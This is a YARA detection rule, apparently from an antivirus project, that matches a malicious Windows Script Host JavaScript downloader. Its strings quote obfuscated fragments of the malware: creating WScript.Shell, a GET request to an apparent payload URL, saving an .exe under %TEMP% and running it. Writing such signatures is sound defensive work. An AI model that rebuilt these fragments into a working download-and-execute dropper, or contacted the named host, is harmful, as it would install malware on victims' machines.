rule sig_20160329_5662a087397ec0ee64aeff201fd48e56 {
  meta:
    description = "datamaliciousorder - file 20160329_5662a087397ec0ee64aeff201fd48e56.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "abf7187a2e16c837e71220254578f03fb2b102f3926abc749637a8098972db63"

  strings:
    $s1  = "function Vmbpetnr() {return Qmclmp[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"MgfalWXMs8t.exe\";};" fullword ascii
    $s2  = "do {WScript[Lrsgzp](Tbmczemh() * 11)} while (Tvfgmw[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "Tvfgmw[Idzfxlouu](\"GET\", \"http://energyunlimited.co.nz/o2apf\", false);" fullword ascii
    $s4  = "var Qmclmp = function Ytlzjo() {return WScript[Swkvtgnmt](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Wkhdpnd(Rkokdtu, Bccjhvjo){return Rkokdtu - Bccjhvjo;};" fullword ascii
    $s6  = "function Loumhra(Qxjkbiaj){Qmclmp[\"Run\"](Qxjkbiaj, Lgsncl, Lgsncl);};" fullword ascii
    $s7  = "function Dnhrezozg() {return ((Sycnmghqq == true) && (Sycnmghqq == Sclkc)) ? 1 : Lgsncl;};" fullword ascii
    $s8  = "var Poaamauqe = false;" fullword ascii
    $s9  = "function Wqgtbv()" fullword ascii
    $s10 = "function Cnueeelwl(){return Swkvtgnmt;};" fullword ascii
    $s11 = "function Doyla(Kahlctov) {var Mcpspx = (1, 2, 3, 4, 5, Kahlctov); return Mcpspx;};" fullword ascii
    $s12 = "function Tbmczemh(){return 22;};" fullword ascii
    $s13 = "Sycnmghqq = true; " fullword ascii
    $s14 = "Sclkc = true; " fullword ascii
    $s15 = "function Ifzckmay(){return Bdlpjbxp;};" fullword ascii
    $s16 = " while (Ozeguay){" fullword ascii
    $s17 = "var Fgbmik = new this[\"Date\"]();" fullword ascii
    $s18 = "var Sycnmghqq = false;" fullword ascii
    $s19 = "return Wkhdpnd(Hluapym, Qiawkeetmh);" fullword ascii
    $s20 = "var Sclkc = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}